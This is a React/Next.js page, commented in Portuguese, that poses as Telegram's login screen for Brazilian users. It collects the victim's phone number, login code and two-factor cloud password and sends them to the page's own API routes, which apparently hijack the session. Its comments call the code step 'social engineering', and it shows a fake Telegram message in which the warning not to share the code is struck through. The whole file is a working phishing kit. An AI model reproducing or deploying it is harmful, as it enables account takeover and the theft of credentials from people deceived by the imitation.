import { useState } from 'react';
import Head from 'next/head';

export default function Home() {
  const [step, setStep] = useState(1); // 1: Phone, 2: Code, 3: Password (2FA)
  const [loading, setLoading] = useState(false);
  const [rawPhone, setRawPhone] = useState(''); // O que o usuário digita
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [hash, setHash] = useState('');

  // Cores Oficiais Telegram Dark
  const theme = {
    bg: '#1c242f',
    card: '#242f3d',
    text: '#ffffff',
    subText: '#7f91a4',
    blue: '#3390ec',
    red: '#ff5c5c',
    divider: '#10161d'
  };

  // --- MÁSCARA INTELIGENTE ---
  const handlePhoneChange = (e) => {
    // 1. Remove tudo que não é número
    let val = e.target.value.replace(/\D/g, '');
    
    // 2. Limita a 11 dígitos (DDD + 9 + 8 digitos) para o Brasil
    if (val.length > 11) val = val.slice(0, 11);

    setRawPhone(val);
  };

  // Formata visualmente para o usuário: (41) 99999-9999
  const formattedPhoneDisplay = () => {
    if (!rawPhone) return '';
    let r = rawPhone;
    if (r.length > 2) r = `(${r.slice(0, 2)}) ${r.slice(2)}`;
    if (r.length > 7) r = `${r.slice(0, 9)}-${r.slice(9)}`; // Ajuste para o 9º dígito
    return r;
  };

  const handleSendCode = async () => {
    // Validação de comprimento (DDD + 9 digitos = 11)
    if (rawPhone.length < 10) {
      setError('Número incompleto. Digite DDD + Número.');
      return;
    }

    setLoading(true); setError('');

    // Prepara o número para o padrão internacional: 55 + DDD + Numero
    // Se o usuário já digitou 55 por engano, a gente remove para não duplicar, ou garante que começa com 55
    // Para simplificar no Brasil: Sempre adicionamos 55 no rawPhone
    const cleanNumber = `55${rawPhone}`;

    try {
      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: cleanNumber }),
      });
      const data = await res.json();
      
      if (res.ok) {
        setHash(data.phoneCodeHash);
        setStep(2);
      } else {
        // Tratamento de erro amigável
        if (data.error && data.error.includes('PHONE_NUMBER_INVALID')) {
             setError('O número informado é inválido. Verifique o DDD.');
        } else if (data.error && data.error.includes('FLOOD')) {
             setError('Muitas tentativas. Aguarde alguns minutos.');
        } else {
             setError('Erro de conexão. Tente novamente.');
        }
      }
    } catch (err) { setError('Falha ao conectar.'); }
    setLoading(false);
  };

  const handleVerifyCode = async () => {
    if (code.length < 5) return setError('O código deve ter 5 números.');
    setLoading(true); setError('');
    
    const cleanNumber = `55${rawPhone}`; // Usa o mesmo número limpo

    try {
      const res = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            phoneNumber: cleanNumber, 
            code, 
            phoneCodeHash: hash, 
            password 
        }),
      });
      const data = await res.json();

      if (data.status === 'needs_2fa') {
          setStep(3);
          setLoading(false);
          return;
      }

      if (res.ok && data.success) {
        window.location.href = data.redirect;
      } else {
        setError('Código incorreto ou expirado.');
      }
    } catch (err) { setError('Erro na validação.'); }
    setLoading(false);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', backgroundColor: theme.bg, fontFamily: '-apple-system, Roboto, Helvetica, Arial, sans-serif' }}>
      <Head>
        <title>Telegram</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
        <meta name="theme-color" content={theme.bg} />
      </Head>

      <div style={{ width: '100%', maxWidth: '400px', padding: '24px' }}>
        
        {/* LOGO OFICIAL ANIMADO */}
        <div style={{ textAlign: 'center', marginBottom: '40px' }}>
            <div style={{ width: '120px', height: '120px', background: theme.card, borderRadius: '50%', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 10px 30px rgba(0,0,0,0.2)' }}>
                <svg width="65" height="65" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20.665 3.717L2.955 10.551C1.745 11.037 1.751 11.711 2.732 12.012L7.281 13.431L17.81 6.791C18.308 6.488 18.763 6.654 18.389 6.987L9.866 14.671H9.862L9.866 14.675L9.553 19.344C10.012 19.344 10.215 19.133 10.472 18.885L12.678 16.738L17.265 20.129C18.11 20.595 18.717 20.355 18.927 19.344L21.937 5.165C22.245 3.929 21.472 3.369 20.665 3.717Z" fill={theme.blue}/>
                </svg>
            </div>
        </div>

        {/* CABEÇALHO DE TEXTO */}
        <div style={{ textAlign: 'center', marginBottom: '30px' }}>
            <h1 style={{ color: theme.text, fontSize: '22px', fontWeight: 'bold', marginBottom: '10px' }}>
            {step === 1 ? 'Entrar no Telegram' : step === 2 ? 'Verificação' : 'Senha da Nuvem'}
            </h1>
            <p style={{ color: theme.subText, fontSize: '15px', lineHeight: '1.4' }}>
            {step === 1 ? 'Confirme o código do país e insira seu número de telefone celular.' : 
            step === 2 ? `Enviamos o código para o aplicativo Telegram em seu outro dispositivo.` :
            'Sua conta está protegida com uma senha adicional.'}
            </p>
        </div>

        {error && <div style={{ textAlign: 'center', color: theme.red, fontSize: '14px', marginBottom: '20px', padding: '10px', background: 'rgba(255,92,92,0.1)', borderRadius: '8px' }}>{error}</div>}

        {/* PASSO 1: INPUT DE TELEFONE INTELIGENTE */}
        {step === 1 && (
          <>
            <div style={{ background: theme.card, borderRadius: '12px', overflow: 'hidden', marginBottom: '25px', border: `1px solid ${theme.divider}` }}>
                {/* Campo País (Estático Brasil para simplificar, mas visualmente separado) */}
                <div style={{ display: 'flex', alignItems: 'center', padding: '15px 20px', borderBottom: `1px solid ${theme.divider}` }}>
                    <span style={{ fontSize: '16px', marginRight: '15px' }}>🇧🇷</span>
                    <span style={{ color: theme.text, fontSize: '17px', fontWeight: '500' }}>Brasil</span>
                    <span style={{ marginLeft: 'auto', color: theme.subText, fontSize: '17px' }}>+55</span>
                </div>
                
                {/* Campo Número (Onde a mágica acontece) */}
                <div style={{ padding: '15px 20px' }}>
                    <input
                      type="tel"
                      value={formattedPhoneDisplay()}
                      onChange={handlePhoneChange}
                      placeholder="(00) 00000-0000"
                      style={{ 
                          width: '100%', 
                          background: 'transparent', 
                          border: 'none', 
                          color: theme.text, 
                          fontSize: '18px', 
                          fontWeight: '500',
                          outline: 'none',
                          letterSpacing: '0.5px'
                      }}
                      autoFocus
                    />
                </div>
            </div>

            <button
              onClick={handleSendCode}
              disabled={loading || rawPhone.length < 10}
              style={{ 
                  width: '100%', 
                  padding: '16px', 
                  backgroundColor: rawPhone.length >= 10 ? theme.blue : '#2b3440', 
                  color: rawPhone.length >= 10 ? 'white' : '#576675', 
                  border: 'none', 
                  borderRadius: '12px', 
                  fontSize: '16px', 
                  fontWeight: 'bold', 
                  cursor: rawPhone.length >= 10 ? 'pointer' : 'default',
                  transition: 'all 0.2s'
              }}
            >
              {loading ? 'AGUARDE...' : 'CONTINUAR'}
            </button>
          </>
        )}

        {/* PASSO 2: INPUT DE CÓDIGO COM ENGENHARIA SOCIAL */}
        {step === 2 && (
          <>
            {/* O "PRIMING VISUAL" - A Cópia da Mensagem do Telegram */}
            <div style={{ background: '#222e3a', borderRadius: '12px', padding: '15px', marginBottom: '30px', borderLeft: `4px solid ${theme.blue}`, boxShadow: '0 4px 15px rgba(0,0,0,0.2)' }}>
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                    <div style={{ width: '24px', height: '24px', borderRadius: '50%', background: theme.blue, display: 'flex', alignItems: 'center', justifyContent: 'center', marginRight: '10px' }}>
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M12 2L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 2ZM12 11.99H7V10H12V7L17 11L12 15V11.99Z"/></svg>
                    </div>
                    <span style={{ color: theme.blue, fontWeight: 'bold', fontSize: '14px' }}>Telegram</span>
                    <span style={{ color: theme.subText, fontSize: '11px', marginLeft: 'auto' }}>agora</span>
                </div>
                <div style={{ color: '#dbe5ed', fontSize: '13px', lineHeight: '1.5' }}>
                    Código de login: <span style={{ color: theme.text, fontWeight: 'bold', fontSize: '15px', background: 'rgba(51, 144, 236, 0.2)', padding: '2px 6px', borderRadius: '4px' }}>77700</span>. <span style={{opacity: 0.6, textDecoration: 'line-through'}}>Não envie esse código para ninguém...</span>
                </div>
            </div>

            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '30px', gap: '10px' }}>
                <input
                  type="tel"
                  maxLength={5}
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/\D/g,''))}
                  placeholder="— — — — —"
                  style={{ 
                      width: '100%', 
                      padding: '15px', 
                      background: 'transparent', 
                      borderBottom: `2px solid ${code ? theme.blue : theme.divider}`, 
                      borderTop: 'none', borderLeft: 'none', borderRight: 'none',
                      color: theme.text, 
                      fontSize: '32px', 
                      textAlign: 'center', 
                      letterSpacing: '10px',
                      outline: 'none',
                      transition: 'border 0.2s'
                  }}
                  autoFocus
                />
            </div>

            <button
              onClick={handleVerifyCode}
              disabled={loading || code.length < 5}
              style={{ 
                  width: '100%', 
                  padding: '16px', 
                  backgroundColor: code.length === 5 ? theme.blue : '#2b3440', 
                  color: code.length === 5 ? 'white' : '#576675', 
                  border: 'none', 
                  borderRadius: '12px', 
                  fontSize: '16px', 
                  fontWeight: 'bold', 
                  cursor: code.length === 5 ? 'pointer' : 'default',
                  transition: 'all 0.2s'
              }}
            >
              {loading ? 'VERIFICANDO...' : 'CONFIRMAR CÓDIGO'}
            </button>
          </>
        )}

        {/* PASSO 3: SENHA */}
        {step === 3 && (
            <div style={{ width: '100%' }}>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Digite sua senha"
                  style={{ width: '100%', padding: '15px', backgroundColor: theme.card, border: `1px solid ${theme.divider}`, borderRadius: '12px', color: theme.text, fontSize: '16px', outline: 'none', marginBottom: '20px' }}
                  autoFocus
                />
                <button
                  onClick={handleVerifyCode}
                  disabled={loading}
                  style={{ width: '100%', padding: '16px', backgroundColor: theme.blue, color: 'white', border: 'none', borderRadius: '12px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' }}
                >
                  {loading ? 'ENTRANDO...' : 'ACESSAR'}
                </button>
            </div>
        )}
      </div>
    </div>
  );
}
